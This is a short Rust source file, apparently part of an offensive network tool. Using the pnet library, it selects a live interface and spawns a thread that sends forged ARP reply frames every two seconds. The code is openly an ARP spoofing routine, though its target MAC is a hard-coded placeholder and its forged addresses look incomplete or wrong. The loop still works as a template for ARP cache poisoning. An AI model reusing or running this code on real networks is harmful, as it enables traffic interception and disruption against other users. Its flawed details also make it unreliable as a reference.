// $t@$h
use std::{net::Ipv4Addr, thread, time::Duration};

use pnet::datalink::{self, Channel::Ethernet, MacAddr, NetworkInterface};
use pnet::packet::{
    arp::{ArpHardwareTypes, ArpOperations, MutableArpPacket},
    ethernet::{EtherTypes, MutableEthernetPacket},
    Packet,
};
use anyhow::{Context, Result};

pub fn initialize_network() -> Result<(NetworkInterface, MacAddr, Ipv4Addr)> {
    let interface = datalink::interfaces()
        .into_iter()
        .find(|iface| iface.is_up() && iface.is_broadcast() && !iface.is_loopback())
        .context("No usable interface found")?;

    let mac = interface.mac.context("No MAC found")?;
    let ip = interface
        .ips
        .iter()
        .find_map(|ip| if ip.is_ipv4() { Some(ip.ip()) } else { None })
        .context("No IPv4 found")?;

    Ok((interface, mac, ip.to_string().parse()?))
}

pub fn resolve_target_mac(_iface: &NetworkInterface, _local_ip: Ipv4Addr, _source_mac: MacAddr) -> Result<MacAddr> {
    // TODO: Live ARP resolution. For now, fake target MAC.
    Ok(MacAddr::new(0xde, 0xad, 0xbe, 0xef, 0x00, 0x01))
}

pub fn spawn_arp_spoofing_task(interface: NetworkInterface, source_mac: MacAddr, target_mac: MacAddr, local_ip: Ipv4Addr) {
    thread::spawn(move || {
        let mut tx = match datalink::channel(&interface, Default::default()) {
            Ok(Ethernet(tx, _)) => tx,
            Ok(_) | Err(_) => panic!("ARP tx channel failed"),
        };

        let mut buffer = [0u8; 42];
        let mut arp_buf = [0u8; 28];

        loop {
            let mut arp = MutableArpPacket::new(&mut arp_buf).unwrap();
            arp.set_hardware_type(ArpHardwareTypes::Ethernet);
            arp.set_protocol_type(EtherTypes::Ipv4);
            arp.set_hw_addr_len(6);
            arp.set_proto_addr_len(4);
            arp.set_operation(ArpOperations::Reply);
            arp.set_sender_hw_addr(source_mac);
            arp.set_sender_proto_addr(local_ip);
            arp.set_target_hw_addr(target_mac);
            arp.set_target_proto_addr(local_ip);

            let mut eth = MutableEthernetPacket::new(&mut buffer).unwrap();
            eth.set_destination(target_mac);
            eth.set_source(source_mac);
            eth.set_ethertype(EtherTypes::Arp);
            eth.set_payload(arp.packet());

            tx.send_to(eth.packet(), None).unwrap();
            thread::sleep(Duration::from_secs(2));
        }
    });
}
